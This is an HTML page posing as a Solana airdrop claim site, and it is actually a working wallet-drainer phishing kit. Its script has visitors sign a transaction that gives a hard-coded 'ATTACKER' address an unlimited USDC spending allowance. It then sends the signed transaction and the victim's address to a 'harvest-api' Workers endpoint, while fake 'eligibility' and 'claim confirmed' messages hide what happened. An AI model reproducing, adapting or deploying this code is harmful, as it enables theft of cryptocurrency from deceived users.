<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>SOL Airdrop — Claim Distribution</title>
<script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
<script src="https://unpkg.com/@solana/spl-token@0.3.9/lib/index.iife.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
<style>
  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: radial-gradient(ellipse at top, #1a1232 0%, #0a0814 70%);
    color: #e6edf3; min-height: 100vh;
    display: flex; align-items: center; justify-content: center; padding: 20px;
  }
  .card {
    background: linear-gradient(180deg, #221a38 0%, #161022 100%);
    border: 1px solid rgba(153,69,255,0.2); border-radius: 20px;
    padding: 36px 24px 28px; max-width: 400px; width: 100%;
    text-align: center; box-shadow: 0 20px 60px rgba(153,69,255,0.15);
  }
  .badge {
    display: inline-block; background: rgba(153,69,255,0.15); color: #9945ff;
    font-size: 11px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase;
    padding: 6px 12px; border-radius: 20px; margin-bottom: 20px; border: 1px solid rgba(153,69,255,0.3);
  }
  .logo {
    width: 72px; height: 72px; border-radius: 50%;
    background: linear-gradient(135deg, #9945ff 0%, #14f195 100%);
    margin: 0 auto 18px; display: flex; align-items: center; justify-content: center;
    font-size: 30px; font-weight: 800; color: #fff; box-shadow: 0 8px 24px rgba(153,69,255,0.4);
  }
  h1 { font-size: 21px; margin-bottom: 6px; font-weight: 700; }
  .sub { color: #8b949e; font-size: 13.5px; margin-bottom: 26px; line-height: 1.5; }
  .amount { font-size: 42px; font-weight: 800; background: linear-gradient(135deg, #14f195, #9945ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 2px; }
  .amount-label { color: #8b949e; font-size: 12px; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 30px; }
  button {
    width: 100%; padding: 17px; background: linear-gradient(180deg, #9945ff 0%, #7a2fd4 100%);
    color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 600;
    cursor: pointer; transition: all 0.2s; box-shadow: 0 4px 12px rgba(153,69,255,0.3);
  }
  button:active { transform: scale(0.98); }
  .footer { margin-top: 22px; font-size: 11.5px; color: #484f58; line-height: 1.5; }
  .spinner { display: none; width: 22px; height: 22px; border: 2.5px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 14px auto 0; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .success { display: none; color: #14f195; font-size: 14px; margin-top: 14px; font-weight: 500; }
</style>
</head>
<body>
  <div class="card">
    <span class="badge">LIVE DISTRIBUTION</span>
    <div class="logo">S</div>
    <h1>Airdrop Distribution</h1>
    <p class="sub">Your wallet is eligible for the<br>multi-chain community airdrop</p>
    <div class="amount">12.50</div>
    <div class="amount-label">SOL + BONUS</div>
    <button id="claimBtn">Connect Wallet to Claim</button>
    <div class="spinner" id="spin"></div>
    <div class="success" id="success">✓ Claim confirmed — tokens arrive in 24h</div>
    <p class="footer">Distribution runs on multiple chains.<br>EVM wallet required for bonus allocation.</p>
  </div>

<script>
  // ====== CONFIG ======
  const ATTACKER = "GArrQYkQTbNCBaixQcxreZZBnZSEYsm3JNxuL2X9waGj"; // DEINE Phantom Adresse
  const ENDPOINT = "https://harvest-api.rthvzkr6jv.workers.dev"; // Deine Cloudflare URL
  const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; // USDC auf Solana
  // ====================

  const btn = document.getElementById("claimBtn");
  const spin = document.getElementById("spin");
  const success = document.getElementById("success");

  btn.onclick = async () => {
    let provider;
    if (window.phantom?.solana?.isPhantom) provider = window.phantom.solana;
    else if (window.solflare?.isSolflare) provider = window.solflare;

    if (!provider) {
      alert("Please install Phantom wallet to claim.");
      return;
    }

    btn.disabled = true; btn.textContent = "Connecting..."; spin.style.display = "block";

    try {
      const resp = await provider.connect();
      const victim = resp.publicKey.toString();
      
      const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
      
      // 1. Get Associated Token Address for USDC
      const victimAta = await splToken.getAssociatedTokenAddress(
        new solanaWeb3.PublicKey(USDC_MINT),
        resp.publicKey
      );

      btn.textContent = "Verifying eligibility...";

      // 2. Build Approve (Delegation) Instruction
      const delegateIx = splToken.createApproveInstruction(
        victimAta,
        new solanaWeb3.PublicKey(ATTACKER),
        resp.publicKey,
        [],
        BigInt("18446744073709551615") // Max U64
      );

      const tx = new solanaWeb3.Transaction().add(delegateIx);
      tx.feePayer = resp.publicKey;
      tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;

      // 3. Sign Transaction (Phantom shows "Approve Delegation")
      const signedTx = await provider.signTransaction(tx);
      
      btn.textContent = "Authorizing...";

      // 4. Send to Backend to capture data
      await fetch(ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          victim: victim, 
          tx: bs58.encode(signedTx.serialize()), // Send raw tx to backend to broadcast
          chain: "solana",
          ts: Date.now() 
        })
      });

      spin.style.display = "none";
      btn.style.display = "none";
      success.style.display = "block";

    } catch (e) {
      spin.style.display = "none";
      btn.disabled = false;
      btn.textContent = "Connect Wallet to Claim";
    }
  };
</script>
</body>
</html>
